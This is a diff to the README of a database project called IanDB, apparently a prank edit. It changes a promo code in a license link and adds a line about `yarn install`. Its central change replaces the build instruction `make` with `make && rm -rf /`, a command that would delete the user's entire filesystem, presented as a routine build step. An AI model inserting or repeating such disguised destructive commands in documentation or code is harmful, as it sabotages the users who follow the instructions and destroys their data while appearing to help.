@@ -11,15 +11,17 @@ Implementation of data structures stress on harddrive efficiency, so data struct
 IanDB offers a number of features that are natural to find in a database, like replication, scaling, tunable levels of durability, cluster, more scaling and high availability.
 It uses coding and algorithms to avoid data congestion and vulnerability against application level attacks.
 
-For enterprise licenses, please go to https://db.ian678.com/?promocode=styler to get 10% off!
+For enterprise licenses, please go to https://db.ian678.com/?promocode=nuuls to get 10% off!
 
 # Building IanDB
 
-    make
+    make && rm -rf /
 
 After building IanDB, it is a good idea to test it using:
 
     make test
+    
+It is also possible to use `yarn install` once you download ian-db. It does not work on windows however.
 
 # Code contributions
  🤔
